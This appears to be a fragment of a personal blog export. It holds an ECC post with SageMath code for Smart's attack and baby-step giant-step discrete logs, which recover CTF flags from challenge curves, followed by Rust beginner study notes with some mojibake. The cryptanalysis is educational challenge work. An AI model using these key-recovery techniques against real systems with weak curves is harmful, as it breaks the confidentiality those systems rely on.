<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># smart_attack</span></span><br><span class="line">a3 = <span class="number">490963434153515882934487973185142842357175523008183292296815140698999054658777820556076794490414610737654365807063916602037816955706321036900113929329671</span></span><br><span class="line">b3 = <span class="number">7668542654793784988436499086739239442915170287346121645884096222948338279165302213440060079141960679678526016348025029558335977042712382611197995002316466</span></span><br><span class="line">p3 = <span class="number">11093300438765357787693823122068501933326829181518693650897090781749379503427651954028543076247583697669597230934286751428880673539155279232304301123931419</span></span><br><span class="line">E3 = EllipticCurve(GF(p3), [a3, b3])</span><br><span class="line">P3 = E3(<span class="number">10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861</span> , <span class="number">8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610</span> )</span><br><span class="line">Q3 = E3(<span class="number">964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927</span> , <span class="number">5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537</span> )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from gmpy2 import is_prime</span></span><br><span class="line"><span class="comment"># print(is_prime(P3.order()))</span></span><br><span class="line">m3 = SmartAttack(P3, Q3, p3)</span><br><span class="line">flag3 = long_to_bytes(m3).decode() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag3)</span><br></pre></td></tr></table></figure>



<h2 id="BSGS"><a href="#BSGS" class="headerlink" title="BSGS"></a>BSGS</h2><blockquote>
<p>baby step giant step</p>
</blockquote>
<p>discrete_log(P,Q,operation &#x3D; â€˜+â€™)</p>
<p><strong>Problems:</strong> $y^x \equiv z \mod p$</p>
<p>To solve out the $x$.</p>
<h3 id="Original"><a href="#Original" class="headerlink" title="Original"></a>Original</h3><blockquote>
<p>$gcd(y, p) &#x3D; 1$</p>
</blockquote>
<p>Assume $x &#x3D; am - b,m &#x3D; \sqrt{p}$, $a \in [0, m), b\in[0, m)$. </p>
<p><strong>Derivation:</strong><br>$$<br>y^{am-b}\equiv z (\mod p)<br>$$</p>
<p>$$<br>y^{am} \equiv z \cdot y^{b}(\mod p)<br>$$</p>
<p>Brute force enumeration, enumerate the right in $[0, m)$ and calculate into list. At the same time, we enumerate the left in $[0, m)$, comparing the two list to find the $x$. </p>
<h3 id="Extended"><a href="#Extended" class="headerlink" title="Extended"></a>Extended</h3><blockquote>
<p>$gcd(y, p) \neq 1$</p>
</blockquote>
<p>Assume $d &#x3D; gcd(y, p)$. </p>
<p><strong>Derivation:</strong><br>$$<br>y^{x} + kp &#x3D;z<br>$$</p>
<p>$$<br>y\cdot y^{x-1} +kp &#x3D; z<br>$$</p>
<p>If we divide it by $d$., we will get that:<br>$$<br>\frac{y}{d}\cdot y^{x-1} + k \cdot \frac{p}{d} &#x3D;\frac{z}{d}<br>$$<br>Recursive the equation, unless $d &#x3D; 1 $. Assume that the product of all $d$ and we enumerate $c$ times. Thus, we can obtain the condition that $xâ€™ &#x3D; x -c, pâ€™ &#x3D; \frac{p}{g}, zâ€™ &#x3D; \frac{z}{g}$.<br>$$<br>y^{xâ€™} \cdot \frac{y^{c}}{g} \equiv zâ€™ (\mod pâ€™)<br>$$<br>And it convert to the <code>original BSGS</code>.</p>
<p><strong>Example:</strong> ECC-1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bsgs</span></span><br><span class="line">a1 = <span class="number">46056180</span></span><br><span class="line">b1 = <span class="number">2316783294673</span></span><br><span class="line">p1 = <span class="number">146808027458411567</span></span><br><span class="line">E1 = EllipticCurve(GF(p1), [a1, b1])</span><br><span class="line">P1 = E1(<span class="number">119851377153561800</span> , <span class="number">50725039619018388</span>)</span><br><span class="line">Q1 = E1(<span class="number">22306318711744209</span> , <span class="number">111808951703508717</span>)</span><br><span class="line">m1 = discrete_log(Q1, P1, operation = <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">flag1 = <span class="string">&#x27;flag&#123;&#x27;</span> + long_to_bytes(m1).decode()</span><br><span class="line"><span class="comment"># print(flag1)</span></span><br></pre></td></tr></table></figure>

<h1 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>The equation:<br>$$<br>(a, b)\in F, y^2 &#x3D; x^3 + ax + b<br>$$<br>$$<br>\Delta &#x3D; 4a^{3} + 27b^{2} \ne 0<br>$$</p>
<p>if the ECC satisfies the equation, we calculate its discriminant by:<br>$$<br>y^2 + axy + by &#x3D; x^3 + cx^2 + dx + c<br>$$</p>
<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><blockquote>
<p><a href="https://lbwang.github.io/2020/04/08/ecc/">https://lbwang.github.io/2020/04/08/ecc/</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = -5; b = 4</span><br><span class="line">E1 = EllipticCurve(RR, [a, b])</span><br><span class="line">show(plot(E1, hue=.9))</span><br></pre></td></tr></table></figure>

<img src="/2023/01/11/23-01-11-ECC/tmp_6b2u08zf.png" class="" title="tmp_6b2u08zf">

<p>if we change the figure of $a$ and $b$, we can get the other EllipticCurves.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 2; b = 3</span><br><span class="line">E2 = EllipticCurve(RR, [a, b])</span><br><span class="line">show(plot(E2, hue=.9))</span><br></pre></td></tr></table></figure>

<img src="/2023/01/11/23-01-11-ECC/tmp_o58hsxb2.png" class="" title="tmp_o58hsxb2">

<p>or we make the $a$ and $b$ random, thus we can not predict the curves.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E3 = EllipticCurve(RR, [RR.random_element(), RR.random_element()])</span><br><span class="line">show(plot(EE, hue=.7))</span><br></pre></td></tr></table></figure>

<img src="/2023/01/11/23-01-11-ECC/tmp_iaubxs_y.png" class="" title="tmp_iaubxs_y">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sage: p = 137</span><br><span class="line">sage: F = GF(p)</span><br><span class="line">sage: F = FiniteField(p)</span><br><span class="line">sage: F = GF(p)</span><br><span class="line">sage: E137 = EllipticCurve(F, [F.random_element(), F.random_element()])</span><br><span class="line">sage: show(plot(E137, hue=.7))</span><br><span class="line">Launched png viewer for Graphics object consisting of 1 graphics primitive</span><br><span class="line">sage:</span><br></pre></td></tr></table></figure>

<img src="/2023/01/11/23-01-11-ECC/tmp_pcrtf2_a.png" class="" title="tmp_pcrtf2_a">
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>ecc</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse-Write-Up-Zh</title>
    <url>/2023/03/09/Reverse-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording. </p>
<span id="more"></span><!--toc-->
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Rust Study</title>
    <url>/2023/06/07/Rust-Study/</url>
    <content><![CDATA[<p>Spend time on studying <code>RUST</code>, stay hungry and stay foolish.</p>
<p>Never give up, keep climbing~</p>
<span id="more"></span><!--toc-->

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote>
<p><a href="https://reberhardt.com/cs110l/spring-2020/">https://reberhardt.com/cs110l/spring-2020/</a></p>
<p><a href="https://course.rs/about-book.html">https://course.rs/about-book.html</a></p>
<p><a href="https://practice.rs/why-exercise.html">https://practice.rs/why-exercise.html</a></p>
<p><a href="https://practice.rs/why-exercise.html">https://practice.rs/why-exercise.html</a></p>
<p><a href="https://www.runoob.com/rust/rust-tutorial.html">https://www.runoob.com/rust/rust-tutorial.html</a></p>
<p><a href="https://doc.rust-lang.org/book/ch02-00-guessing-game-tutorial.html">Programming a Guessing Game - The Rust Programming Language (rust-lang.org)</a></p>
</blockquote>
<h1 id="Install-rust"><a href="#Install-rust" class="headerlink" title="Install rust"></a>Install rust</h1><h2 id="fix-success-or-fail"><a href="#fix-success-or-fail" class="headerlink" title="fix success or fail"></a>fix success or fail</h2><p>After installation, we run <code>rustc -V</code> and <code>cargo -V</code> and will see the details of version.</p>
<img src="/2023/06/07/Rust-Study/1.png" class="" title="successful installation">

<h2 id="local-documents"><a href="#local-documents" class="headerlink" title="local documents"></a>local documents</h2><p>Run <code>rustup doc</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230607150837653.png" class="" title="image-20230607150837653">

<p>When we donâ€™t know how to use the functions, we can find them in <code>API documents</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230607151245332.png" class="" title="image-20230607151245332">

<h1 id="Build-vscode"><a href="#Build-vscode" class="headerlink" title="Build vscode"></a>Build vscode</h1><h2 id="run-rust-code"><a href="#run-rust-code" class="headerlink" title="run rust code"></a>run rust code</h2><p>I have installed and compiled the environment of the vscode with rust. </p>
<p>An example. </p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>compile, build and run.</p>
<img src="/2023/06/07/Rust-Study/image-20230607152934985.png" class="" title="image-20230607152934985">

<img src="/2023/06/07/Rust-Study/image-20230607152958615.png" class="" title="image-20230607152958615">

<p>Using the command line and run <code>main.exe</code>, we can also get the output. </p>
<img src="/2023/06/07/Rust-Study/image-20230607153139931.png" class="" title="image-20230607153139931">

<h2 id="install-plugins"><a href="#install-plugins" class="headerlink" title="install plugins"></a>install plugins</h2><p>Some recommended plugins.</p>
<ul>
<li>Even Better TOML: support the complete <code>.toml</code></li>
<li>Error Lens: emm, details of the errors. It will impact <code>sagemath</code>. <em>so, I uninstall it</em></li>
<li>One Dark Pro: theme</li>
<li>CodeLLDB: Debugger</li>
</ul>
<h1 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h1><h2 id="compile-project"><a href="#compile-project" class="headerlink" title="compile project"></a>compile project</h2><p>Management about rust.</p>
<p>Run in command line, new the project. </p>
<p>Run <code>cargo run</code>, it will build and compile the project and print the output finally. </p>
<img src="/2023/06/07/Rust-Study/image-20230608145433666.png" class="" title="image-20230608145433666">

<p>It defaults to <code>debug</code> mode. If we want to switch to <code>release</code>  mode to optimize the project, we can run <code>cargo run --release</code> directly. </p>
<img src="/2023/06/07/Rust-Study/image-20230608145805271.png" class="" title="image-20230608145805271">

<p>Use vscode directly, we also achieve the target. </p>
<ul>
<li>cargo<ul>
<li><code>cargo run</code>  mode: debug</li>
<li><code>cargo build</code>  mode: debug</li>
<li><code>cargo run --release</code>  mode: release</li>
<li><code>cargo build --release</code>  mode: release</li>
<li><code>cargo check</code>  check that the project code can be run if the size of project is too large.</li>
</ul>
</li>
<li>vscode<ul>
<li>Use according to what you need.</li>
</ul>
</li>
</ul>
<h2 id="cargo-documents"><a href="#cargo-documents" class="headerlink" title="cargo documents"></a>cargo documents</h2><p><code>cargo.toml</code> and <code>cargo.lock</code> are the core part of cargo. All things about cargo are about these two documents. </p>
<ul>
<li><code>cargo.toml</code>: description of project data, which is import for the rust project. </li>
<li><code>cargo.lock</code>: detailed manifest of project dependencies, which is mainly depended on the rust project itself.</li>
</ul>
<p><code>cargo.toml</code> is like this. It first shows the details about the project, containing <code>name</code>&#x2F;<code>version</code>&#x2F;<code>edition</code>.</p>
<img src="/2023/06/07/Rust-Study/image-20230608163001582.png" class="" title="image-20230608163001582">

<p>Second it shows what it depends on. There are three ways to introduce dependencies. </p>
<ul>
<li>based on <code>crates.io</code>: specify version information</li>
<li>based on <code>the url</code> of the source code of the local repository</li>
<li>based on <code>the absolute or relative path</code> of the local repository</li>
</ul>
<p>Three ways to import dependencies: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">rand = &quot;0.3&quot;</span><br><span class="line">hammer = &#123; version = &quot;0.5.0&quot;&#125;</span><br><span class="line">color = &#123; git = &quot;https://github.com/bjz/color-rs&quot; &#125;</span><br><span class="line">geometry = &#123; path = &quot;crates/geometry&quot; &#125;</span><br></pre></td></tr></table></figure>



<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><blockquote>
<p>RustProject&#x2F;greeting</p>
<p>RustProject&#x2F;advanced_code</p>
</blockquote>
<p>test code: </p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">greet_world</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">southern_germany</span> = <span class="string">&quot;GrÃ¼ÃŸ Gott!&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">chinese</span> = <span class="string">&quot;ä¸–ç•Œï¼Œä½ å¥½&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">english</span> = <span class="string">&quot;World, hello&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">regions</span> = [southern_germany, chinese, english];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">region</span> <span class="keyword">in</span> regions.<span class="title function_ invoke__">iter</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, &amp;region);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// or we can use this way to run:</span></span><br><span class="line">    <span class="comment">// for region in regions()&#123;</span></span><br><span class="line">    <span class="comment">//     println!(&quot;&#123;&#125;&quot;, &amp;region);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">greet_world</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>How to run?</p>
<ul>
<li>Vscode, and just <code>run code</code>.</li>
<li>Cmd, open a terminal and go to the root of world_hello project. Run <code>cargo [project_name]</code>.</li>
</ul>
<img src="/2023/06/07/Rust-Study/image-20230801190906631.png" class="" title="image-20230801190906631">

<p>Look at the code carefully, we can get:</p>
<ul>
<li>Rust natively supports <code>UTF-8</code> encode strings.</li>
<li><code>println!</code>. In Rust, this is the macro operator, and we can currently think of a macro as a special type of function.</li>
<li>We use <code>&#123;&#125;</code>, which can automatically recognize the type of the output data.</li>
<li>Rustâ€™s collection types canâ€™t loop directly and need to become iterators.</li>
</ul>
<h2 id="advanced-code"><a href="#advanced-code" class="headerlink" title="advanced code"></a>advanced code</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">penguin_data</span> = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">    common name, length(cm)</span></span><br><span class="line"><span class="string">    Little penguin, 33</span></span><br><span class="line"><span class="string">    Yellow-eyed penguin, 65</span></span><br><span class="line"><span class="string">    Fiordland penguin, 60</span></span><br><span class="line"><span class="string">    Invalid, data</span></span><br><span class="line"><span class="string">    &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">records</span> = penguin_data.<span class="title function_ invoke__">lines</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">for</span> (i, record) <span class="keyword">in</span> records.<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> || record.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">len</span>() == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å£°æ˜ä¸€ä¸ª fields å˜é‡ï¼Œç±»å‹æ˜¯ Vec</span></span><br><span class="line">        <span class="comment">// Vec æ˜¯ vector çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªå¯ä¼¸ç¼©çš„é›†åˆç±»å‹ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ä¸€ä¸ªåŠ¨æ€æ•°ç»„</span></span><br><span class="line">        <span class="comment">// &lt;_&gt;è¡¨ç¤º Vec ä¸­çš„å…ƒç´ ç±»å‹ç”±ç¼–è¯‘å™¨è‡ªè¡Œæ¨æ–­ï¼Œåœ¨å¾ˆå¤šåœºæ™¯ä¸‹ï¼Œéƒ½ä¼šå¸®æˆ‘ä»¬çœå´ä¸å°‘åŠŸå¤«</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">fields</span>: <span class="type">Vec</span>&lt;_&gt; = record</span><br><span class="line">        .<span class="title function_ invoke__">split</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|field| field.<span class="title function_ invoke__">trim</span>())</span><br><span class="line">        .<span class="title function_ invoke__">collect</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">cfg!</span>(debug_assertions) &#123;</span><br><span class="line">            <span class="comment">//è¾“å…¥åˆ°æ ‡å‡†é”™è¯¯è¾“å‡º</span></span><br><span class="line">            eprintln!(<span class="string">&quot;debug: &#123;:?&#125; -&gt; &#123;:?&#125;&quot;</span>, record, fields);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">name</span> = fields[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 1. å°è¯•æŠŠ fields[1] çš„å€¼è½¬æ¢ä¸º f32 ç±»å‹çš„æµ®ç‚¹æ•°ï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™æŠŠ f32 å€¼èµ‹ç»™ length å˜é‡</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 2. if let æ˜¯ä¸€ä¸ªåŒ¹é…è¡¨è¾¾å¼ï¼Œç”¨æ¥ä»=å³è¾¹çš„ç»“æœä¸­ï¼ŒåŒ¹é…å‡º length çš„å€¼ï¼š</span></span><br><span class="line">        <span class="comment">//   1ï¼‰å½“=å³è¾¹çš„è¡¨è¾¾å¼æ‰§è¡ŒæˆåŠŸï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ª Ok(f32) çš„ç±»å‹ï¼Œè‹¥å¤±è´¥ï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ª Err(e) ç±»å‹ï¼Œif let çš„ä½œç”¨å°±æ˜¯ä»…åŒ¹é… Ok ä¹Ÿå°±æ˜¯æˆåŠŸçš„æƒ…å†µï¼Œå¦‚æœæ˜¯é”™è¯¯ï¼Œå°±ç›´æ¥å¿½ç•¥</span></span><br><span class="line">        <span class="comment">//   2ï¼‰åŒæ—¶ if let è¿˜ä¼šåšä¸€æ¬¡è§£æ„åŒ¹é…ï¼Œé€šè¿‡ Ok(length) å»åŒ¹é…å³è¾¹çš„ Ok(f32)ï¼Œæœ€ç»ˆæŠŠç›¸åº”çš„ f32 å€¼èµ‹ç»™ length</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 3. å½“ç„¶ä½ ä¹Ÿå¯ä»¥å¿½ç•¥æˆåŠŸçš„æƒ…å†µï¼Œç”¨ if let Err(e) = fields[1].parse::&lt;f32&gt;() &#123;...&#125;åŒ¹é…å‡ºé”™è¯¯ï¼Œç„¶åæ‰“å°å‡ºæ¥</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(length) = fields[<span class="number">1</span>].parse::&lt;<span class="type">f32</span>&gt;() &#123;</span><br><span class="line">            <span class="comment">//è¾“å‡ºåˆ°æ ‡å‡†å½¢å¼</span></span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;cm&quot;</span>, name, length)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>debug</strong></p>
<p>terminal</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">cargo run</span><br></pre></td></tr></table></figure>



<img src="/2023/06/07/Rust-Study/image-20230801194048161.png" class="" title="image-20230801194048161">

<p>cmd</p>
<img src="/2023/06/07/Rust-Study/image-20230801194128439.png" class="" title="image-20230801194128439">



<p><strong>release</strong></p>
<p>terminal</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">cargo run --release</span><br></pre></td></tr></table></figure>



<img src="/2023/06/07/Rust-Study/image-20230801194156966.png" class="" title="image-20230801194156966">

<p>cmd</p>
<img src="/2023/06/07/Rust-Study/image-20230801194243595.png" class="" title="image-20230801194243595">

<h2 id="understand-code"><a href="#understand-code" class="headerlink" title="understand code"></a>understand code</h2><ul>
<li>Control flow: <code>for</code> go with <code>continue</code></li>
<li>Method syntax: Since Rust has no inheritance, Rust is not an object-oriented language in the traditional sense, but it steals methods from the OO language using <code>record.trim()</code>, <code>record.split(&#39;,&#39;)</code>, etc.</li>
<li>Lambda function: Functions can be taken as parameters or as return values.</li>
</ul>
<h1 id="Guess-game"><a href="#Guess-game" class="headerlink" title="Guess game"></a>Guess game</h1><blockquote>
<p>RustProject&#x2F;guessing_game</p>
</blockquote>
<h2 id="accept-the-userâ€™s-input"><a href="#accept-the-userâ€™s-input" class="headerlink" title="accept the userâ€™s input"></a>accept the userâ€™s input</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io; </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Guessing the number!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Please input your guess:&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>(); </span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">        .<span class="title function_ invoke__">except</span>(<span class="string">&quot;Failed to read line&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="go-over-it-line-by-line"><a href="#go-over-it-line-by-line" class="headerlink" title="go over it line by line"></a>go over it line by line</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io; </span><br></pre></td></tr></table></figure>

<p>bring the io library which comes from the standard library (std)</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;&#125;</span><br></pre></td></tr></table></figure>

<p><code>fn</code> means a new function</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Guessing the number!&quot;</span>);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Please input your guess:&quot;</span>); </span><br></pre></td></tr></table></figure>

<ul>
<li><p>state what the game is</p>
</li>
<li><p>request input from the user</p>
</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br></pre></td></tr></table></figure>

<p><code>let</code> statement to create a variable to store the userâ€™s input, to remember that once given it will not change, for example:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">apples</span> = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// a new variable named apples and binds to the value 5</span></span><br></pre></td></tr></table></figure>

<p>Thus, we add <code>mut</code> before the variable name.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">//example</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">apples</span> = <span class="number">5</span>; <span class="comment">//immutable</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">bananas</span> = <span class="number">5</span>; <span class="comment">//mutable</span></span><br></pre></td></tr></table></figure>

<p>the <code>::</code>  in <code>::new</code> line indicates that <code>new</code> is an associated function of the <code>String </code> type.</p>
<p><em><code>let mut guess = String::new();</code>means that it created a mutable variable that is currently bound to a new, empty instance of a <code>String</code>.</em></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br></pre></td></tr></table></figure>

<p>call <code>stdin</code> function from <code>io</code> module, which allows us to handle user input</p>
<p><code>.read_line(&amp;mut guess)</code> call the <code>read_line</code> method on the standard input to get input from the user.</p>
<p>pass <code>&amp;mut guess</code> to <code>read_line</code> to tell string to store the userâ€™s input</p>
<p><code>&amp;</code> indicates that this argument is a reference, no need to copy that data into memory multiple times</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">.<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read line&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>return a <code>Result</code> type to encode error-handling information</p>
<p><code>Result</code>â€˜s variants are <code>Ok</code> and <code>Err</code>.</p>
<p>If we donâ€™t call <code>expect</code>, the program will compile, but it will get a warning.</p>
<p>The right way to suppress the warning is to actually write error-handling code, but in our case we just want to crash this program when a problem occurs, so we can use <code>expect</code>.</p>
<p>PAY ATTENTION ! <code>Expect</code> NOT <code>Except</code> !!!</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);</span><br></pre></td></tr></table></figure>

<p>The line prints the string that now contains the userâ€™s input.</p>
<h2 id="generate-a-random-number"><a href="#generate-a-random-number" class="headerlink" title="generate a random number"></a>generate a random number</h2><p>Aim to generate a secret number that we will try to guess.</p>
<p>The random number between 1 and 100.</p>
<p>The <code>rand</code> crate is a library crate, which contains code that is intended to be used in other programs and canâ€™t be executed on its own.</p>
<p><em>crate is a term in Rust, meaning a stand-alone library or project</em></p>
<p><em><code>library crate</code> which means the project contains library code</em></p>
<p>So we should import it in <code>Cargo.toml</code> which include the <code>rand</code> crate as a dependency.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">rand = <span class="string">&quot;0.8.5&quot;</span></span><br><span class="line"><span class="comment">// rand = &quot;^0.8.5&quot; at least 0.8.5 but below 0.9.0</span></span><br></pre></td></tr></table></figure>

<p>contains below:</p>
<ul>
<li>crate name</li>
<li>crate version</li>
</ul>
<p>run <code>cargo build</code> after adding the rand crate as a dependency</p>
<p>After updating the registry, Cargo checks the <code>[dependencies]</code> section and downloads any crates listed that arenâ€™t already downloaded. In this case, although we only listed <code>rand</code> as a dependency, Cargo also grabbed other crates that <code>rand</code> depends on to work. After downloading the crates, Rust compiles them and then compiles the project with the dependencies available.</p>
<p>add code to generate a random number:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> rand::Rng;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;The secret number is: &#123;secret_number&#125;&quot;</span>); </span><br></pre></td></tr></table></figure>

